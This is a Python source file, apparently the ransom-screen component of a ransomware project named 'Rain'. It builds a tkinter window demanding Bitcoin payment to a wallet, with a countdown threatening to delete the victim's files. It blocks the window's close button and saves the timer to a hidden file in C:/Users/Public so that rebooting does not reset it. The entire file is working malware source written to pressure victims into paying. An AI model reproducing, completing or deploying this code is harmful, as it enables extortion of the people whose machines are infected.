#!/usr/bin/env python
# Rain graphical interface
# Developed by WillRazorFace

import tkinter as tk
from tkinter import messagebox
from os.path import exists
from datetime import timedelta

class GUI:
	def __init__(self,
				 title: str,
				 price: float,
				 wallet: str,
				 icon: str,
				 countdown=259200):
		self.title = title
		self.price = price
		self.wallet = wallet
		self.countdown = countdown

		main = tk.Tk()
		main.protocol('WM_DELETE_WINDOW', self.close_window)
		main.geometry('700x450')
		main.title('')
		main.resizable(0, 0)
		main.wm_iconbitmap(bitmap=icon)
		self.main = main

		self.check_remaining_time_file('C:/Users/Public/.hours')
		self.create_widgets()
		self.main.mainloop()

	def check_remaining_time_file(self, file: str):
		# Checks if the file where the remaining time is saved already exists on the machine
		if exists(file) is True:
			with open(file, 'r') as hours:
				self.countdown = int(hours.read())
		else:
			with open(file, 'w') as hours:
				hours.write(str(self.countdown))

	def close_window(self):
		# Function so that the victim cannot close the window by clicking on the "X"
		messagebox.showerror('', '')

	def create_widgets(self):
		# All widgets used in the interface
		now = tk.StringVar()
		wallet = tk.StringVar()
		framemain = tk.Frame(self.main)
		framemainlabel = tk.Frame(framemain, bg='black')
		frametime = tk.Frame(framemain, bg='grey')
		frametiming = tk.Frame(frametime, bg='red')

		rainmain = tk.Label(framemainlabel, text=self.title, bg='black', font=('Doctor Glitch', 60), justify=tk.LEFT, fg='white')
		timeto = tk.Label(frametime, text="TIME LEFT UNTIL I DELETE YOUR FILES", bg='grey', font=('Trebuchet MS', 30), anchor=tk.NW)
		time = tk.Label(frametime, text=now, bg='red', font=('Alarm Clock', 80))
		payto = tk.Label(frametime, text='TRANSFER ' + str(self.price) + ' BITCOIN TO THIS VIRTUAL WALLE.', 
						 bg='grey', font=('Trebuchet MS',20), anchor=tk.NW)
		dontmakemewait = tk.Label(frametime, text="DON'T MAKE ME WAIT.", bg='grey', font=('Trebuchet MS', 40), anchor=tk.NW)

		framemain.place(relwidth=1, relheight=1)
		frametime.place(relwidth=1, relheight=0.8, rely=0.2)
		framemainlabel.place(relwidth=1, relheight=0.2)
		frametiming.place()

		wallet = tk.Text(frametime, height=1, width=37, font=('Trebuchet MS', 20))
		wallet.insert(tk.END, self.wallet)
		wallet.config(state='disabled')

		rainmain.pack()
		timeto.pack()
		time.pack()
		payto.pack()
		dontmakemewait.pack()
		wallet.pack()

		self.time = time

		self.counting()

	def counting(self):
		# Function made to have the counter in the center of the window update every second
		if self.countdown >= 0:
			remaining = timedelta(seconds=self.countdown)
			seconds = remaining.total_seconds()
			hours = seconds // 3600
			minutes = (seconds % 3600) // 60
			seconds = seconds % 60
			remaining = '{}:{}:{}'.format(int(hours), int(minutes), int(seconds))
			if remaining != '':
				self.time.config(text=remaining)
				self.countdown = self.countdown - 1
			self.main.after(1000, self.counting)
			self.save_state(hours, minutes, seconds)

	def save_state(self, h, m, s):
		"""Saves the remaining time the moment it is called, 
			preventing the victim from restarting the machine from restarting the counting progress."""
		with open('C:/Users/Public/.hours', 'w') as hours:
				hours.write(str((int(h)) * 3600 + (int(m)) * 60 + int(s)))
